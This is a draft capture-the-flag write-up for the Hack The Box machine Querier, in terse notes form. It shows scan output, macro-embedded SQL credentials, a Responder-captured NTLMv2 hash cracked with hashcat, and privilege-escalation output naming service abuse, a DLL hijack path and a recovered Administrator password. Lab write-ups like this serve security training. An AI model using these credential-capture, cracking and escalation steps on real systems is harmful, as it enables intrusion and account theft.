---
title: HTB Querier
date: 2026-09-23
author: kei5uke
draft: true
description: Writeup for HTB Querier
tags:
  - windows
  - writeup
---

# Nmap

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2026-09-17T13:40:01+00:00; +1d12h41m10s from scanner time.
| ms-sql-ntlm-info:
|   10.129.73.7:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.73.7:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-17T13:20:18
| Not valid after:  2056-09-17T13:20:18
| MD5:     46ac ef46 6664 a25d 96e0 ce71 e0c7 714e
| SHA-1:   0dbf c16d 19b3 a654 a03d d1bd bfac a9e7 2b34 6fb3
|_SHA-256: aee8 08fa f4d1 0236 ace5 40bf 781b b241 bfed fefe b5b9 32c9 a0e7 15cc 701c 68b3
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-09-17T13:39:53
|_  start_date: N/A
|_clock-skew: mean: 1d12h41m10s, deviation: 0s, median: 1d12h41m09s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

```

# SMB 135

```
smbclient -L \\\\10.129.75.166
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk
```

![[HTB Querier - Screenshot_2026-09-23_at_16.05.21.png]]

Found a username: `Luis`

Analysed the VBA script: `olevba Currency\ Volume\ Report.xlsm --decode`  

```
Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"

```

`reporting`:`PcwTWTHRwryjc$c6`

b'010500000000000515000000e5cfd9d970fd97dacb23a5d1ea030000' 

responder response

```
[SMB] NTLMv2-SSP Client   : 10.129.75.166
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:fe061fdb8731f9d8:12257857733D1D248947DAA3590ED248:0101000000000000802B7C35A54BDD013A99CA568CCA47740000000002000800490043005500440001001E00570049004E002D0037004F0048004700300054004A0050005A005800410004003400570049004E002D0037004F0048004700300054004A0050005A00580041002E0049004300550044002E004C004F00430041004C000300140049004300550044002E004C004F00430041004C000500140049004300550044002E004C004F00430041004C0007000800802B7C35A54BDD010600040002000000080030003000000000000000000000000030000099F2AAA9314367E17AB6042714FBDB0D02CE8DD1AA4BD47D23DAFC30273940410A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0034003100000000000000000000000000
```

`hashcat -m 5600 mssql-svc-hash /usr/share/wordlists/rockyou.txt.gz`

`mssql-svc:corporate568`

```
SeImpersonatePrivilege

RmSvc: GenericExecute (Start/Stop)                                                                                                                                                     
UsoSvc: AllAccess, Start

Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2460
ProcessId   : 3960
Name        : 3960
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files

```
